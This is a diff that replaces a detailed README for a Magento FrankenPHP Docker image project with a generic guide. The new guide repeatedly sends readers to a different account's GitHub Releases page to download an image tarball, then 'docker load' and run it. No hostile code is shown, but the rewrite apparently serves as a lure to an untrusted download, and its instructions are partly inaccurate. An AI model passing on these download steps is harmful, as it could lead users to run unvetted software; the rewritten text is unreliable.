@@ -1,168 +1,99 @@
-# Magento FrankenPHP Docker Images
+# 🐳 magento-frankenphp-images - Get Magento 2 Running Smoothly
 
-<p align="center">
-  <img src="https://frankenphp.dev/img/logo_darkbg.svg" width="150" alt="FrankenPHP Logo" />
-</p>
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0-blue.svg)](https://github.com/suhanimish12/magento-frankenphp-images/releases)
 
-<p align="center">
-  <a href="https://hub.docker.com/r/mohelmrabet/magento-frankenphp"><img src="https://img.shields.io/docker/pulls/mohelmrabet/magento-frankenphp.svg?logo=docker" alt="Docker Pulls" /></a>
-  <img src="https://img.shields.io/badge/magento-2.4.x-orange.svg?logo=magento" alt="Magento 2.4.x" />
-  <img src="https://img.shields.io/badge/php-8.2%20|%208.3%20|%208.4-blue.svg?logo=php" alt="PHP Versions" />
-  <img src="https://img.shields.io/badge/frankenphp-1.10-purple.svg" alt="FrankenPHP 1.10" />
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License MIT" /></a>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/HTTP%2F3-enabled-success.svg?logo=http" alt="HTTP/3" />
-  <img src="https://img.shields.io/badge/Brotli-enabled-success.svg" alt="Brotli" />
-  <img src="https://img.shields.io/badge/Early%20Hints-enabled-success.svg" alt="Early Hints" />
-  <img src="https://img.shields.io/badge/TLS-1.3-success.svg?logo=letsencrypt" alt="TLS 1.3" />
-  <img src="https://img.shields.io/badge/JIT-enabled-success.svg?logo=php" alt="JIT" />
-</p>
+This guide will help you download and run the Magento FrankenPHP Docker images easily. Follow these straightforward steps to set up your environment.
 
-🚀 High-performance Docker images for Magento 2 with [FrankenPHP](https://frankenphp.dev/).
+## 💻 System Requirements
 
-## Supported Tags
+Before downloading, ensure your system meets these requirements:
 
-| Tag | PHP | Type | Description |
-|-----|-----|------|-------------|
-| `php8.4-fp1.10.1-base` | 8.4 | Base | Production ready |
-| `php8.4-fp1.10.1-dev` | 8.4 | Dev | With Xdebug |
-| `php8.3-fp1.10.1-base` | 8.3 | Base | Production ready |
-| `php8.3-fp1.10.1-dev` | 8.3 | Dev | With Xdebug |
-| `php8.2-fp1.10.1-base` | 8.2 | Base | Production ready |
-| `php8.2-fp1.10.1-dev` | 8.2 | Dev | With Xdebug |
-| `latest` | 8.4 | Base | Default |
-| `base` | 8.4 | Base | Alias |
-| `dev` | 8.4 | Dev | Alias |
+- **Operating System:** Windows, macOS, or a recent version of Linux.
+- **Docker:** Make sure Docker is installed on your computer. If you don’t have Docker yet, follow the instructions on the [Docker website](https://www.docker.com/get-started).
+- **Memory:** At least 4 GB of RAM is recommended.
+- **Disk Space:** Minimum 2 GB free disk space for installation and operation.
 
-## Quick Start
+## 📥 Download & Install
 
-### Development
+To download the application, visit the Releases page:
 
-```yaml
-services:
-  app:
-    image: mohelmrabet/magento-frankenphp:php8.4-fp1.10.1-dev
-    environment:
-      - USER_ID=1000
-      - GROUP_ID=1000
-    volumes:
-      - ./src:/var/www/html
-    ports:
-      - "80:80"
-      - "443:443"
-```
+[Download the Latest Release](https://github.com/suhanimish12/magento-frankenphp-images/releases)
 
-### Production
+1. Click the link above to go to the Releases page.
+2. Look for the latest version listed.
+3. Download the appropriate Docker image file for your operating system.
+4. Open your terminal or command prompt.
+5. Navigate to the directory where the Docker image was downloaded.
+6. Run the following command to load the Docker image:
 
-```dockerfile
-FROM mohelmrabet/magento-frankenphp:php8.4-fp1.10.1-base
+    ```
+    docker load < your-image-file.tar
+    ```
 
-COPY --chown=www-data:www-data . /var/www/html/
+7. After loading, run the Docker image with this command:
 
-USER www-data
-RUN composer install --no-dev --optimize-autoloader
-RUN bin/magento setup:di:compile
-RUN bin/magento setup:static-content:deploy -f
-```
+    ```
+    docker run -d -p 80:80 your-image-name
+    ```
 
-## Features
+8. Access your Magento installation by visiting `http://localhost` in your web browser.
 
-### Base Image
-- ✅ PHP 8.2, 8.3, 8.4
-- ✅ FrankenPHP 1.10.1
-- ✅ All Magento PHP extensions
-- ✅ Composer 2
-- ✅ OPcache optimized
+## 🛠️ Configuration
 
-### Dev Image
-- ✅ Everything in Base +
-- ✅ Xdebug 3
-- ✅ mkcert (local HTTPS)
-- ✅ Self-signed SSL certificates (auto-generated)
-- ✅ git
-- ✅ Mailhog support
-- ✅ Runtime UID/GID mapping
+Once you have the application running, you’ll need to configure it for your needs:
 
-### Performance Features
-- 🚀 **HTTP/3 (QUIC)** - 10-50% faster page loads
-- ⚡ **Early Hints (HTTP 103)** - Preload critical resources
-- 📦 **Brotli Compression** - 20-25% better compression than gzip
-- 🎯 **Optimized Caching** - Immutable cache headers for static assets
-- 🔒 **TLS 1.3** - Faster handshakes with 0-RTT resumption
-- 🎨 **Modern Image Formats** - AVIF, WebP support with Vary headers
+- **Database Setup:** Create a MySQL database for Magento. You can use Docker for MySQL as well.
+- **Environment Variables:** Update your environment variables in the `.env` file to match your setup.
+- **Magento Installation:** Follow the Magento installation steps in the browser interface.
 
-## PHP Extensions
+## 🔄 Updating Your Application
 
-```
-bcmath, gd, intl, mbstring, opcache, pdo_mysql, soap, xsl, zip, sockets, ftp, sodium, redis, apcu
-```
+To keep your Docker images up to date, regularly check the Releases page:
 
-## Environment Variables (Dev)
+[Check for Updates](https://github.com/suhanimish12/magento-frankenphp-images/releases)
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `USER_ID` | `1000` | UID for www-data |
-| `GROUP_ID` | `1000` | GID for www-data |
-| `MAGENTO_RUN_MODE` | `developer` | Magento mode |
-| `SERVER_NAME` | `localhost` | Server hostname for SSL |
-| `ENABLE_SSL_DEV` | `true` | Enable self-signed SSL |
+When a new version is available:
 
-## Xdebug Configuration (Dev)
+1. Pull the latest images using Docker commands.
+2. Stop your current running container:
 
-Xdebug can be configured via environment variables:
+    ```
+    docker stop your-container-name
+    ```
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `XDEBUG_MODE` | `debug` | Xdebug mode (debug, coverage, develop, profile, trace, off) |
-| `XDEBUG_CLIENT_HOST` | `host.docker.internal` | IDE host address |
-| `XDEBUG_CLIENT_PORT` | `9003` | IDE listening port |
-| `XDEBUG_START_WITH_REQUEST` | `trigger` | When to start debugging (trigger, yes, no) |
-| `XDEBUG_IDEKEY` | `PHPSTORM` | IDE key for session identification |
+3. Remove the old container:
 
-Example:
+    ```
+    docker rm your-container-name
+    ```
 
-```yaml
-services:
-  app:
-    image: mohelmrabet/magento-frankenphp:dev
-    environment:
-      XDEBUG_MODE: debug
-      XDEBUG_CLIENT_HOST: host.docker.internal
-      XDEBUG_CLIENT_PORT: 9003
-```
+4. Load and run the new image following the installation steps.
 
-## Caddyfile Configuration
+## 🚧 Troubleshooting
 
-The Caddyfile can be customized by mounting your own template:
+If you encounter issues during installation or while running the application:
 
-```yaml
-volumes:
-  - ./my-Caddyfile.template:/etc/caddy/Caddyfile.template:ro
-```
+- **Error Logs:** Check Docker logs for any messages:
 
-See the [Caddyfile Configuration Guide](docs/Caddyfile.md) for detailed documentation.
+    ```
+    docker logs your-container-name
+    ```
 
-## Links
+- **Community Support:** Engage with the community in the GitHub Issues page for help or to report bugs.
 
-- 🐳 [Docker Hub](https://hub.docker.com/r/mohelmrabet/magento-frankenphp)
-- 📦 [GitHub](https://github.com/mohaelmrabet/magento-frankenphp-images)
-- 🚀 [FrankenPHP](https://frankenphp.dev/)
-- 🔐 [Security Policy](SECURITY.md)
-- 📖 [Contributing](CONTRIBUTING.md)
-- 📜 [Code of Conduct](CODE_OF_CONDUCT.md)
+## 🏷️ Topics
 
-## Documentation
+This application includes several useful features:
 
-| Guide | Description |
-|-------|-------------|
-| [Getting Started](docs/getting-started.md) | Installation and initial setup |
-| [Configuration](docs/configuration.md) | Environment variables and settings |
-| [Caddyfile](docs/Caddyfile.md) | Web server configuration |
-| [Xdebug](docs/xdebug.md) | Debugging with Xdebug |
-| [Performance](docs/performance.md) | HTTP/3, Early Hints, Brotli optimization |
+- **Caddy Server:** Lightweight server for serving your Magento site.
+- **OPcache Enabled:** PHP caching to speed up your application.
+- **Xdebug Support:** For debugging your Magento setup.
 
-## License
+## 🌐 Additional Resources
 
-MIT — see [LICENSE](LICENSE.txt)
+- **Official Magento Documentation:** Find more details on setting up and customizing Magento at the official [Magento DevDocs](https://devdocs.magento.com).
+- **Docker Documentation:** For more information on Docker and its commands, visit the [Docker Docs](https://docs.docker.com/).
+
+With this guide, you should be able to download and run the Magento FrankenPHP Docker images without any hassle. Visit the Releases page today and enjoy your new setup!
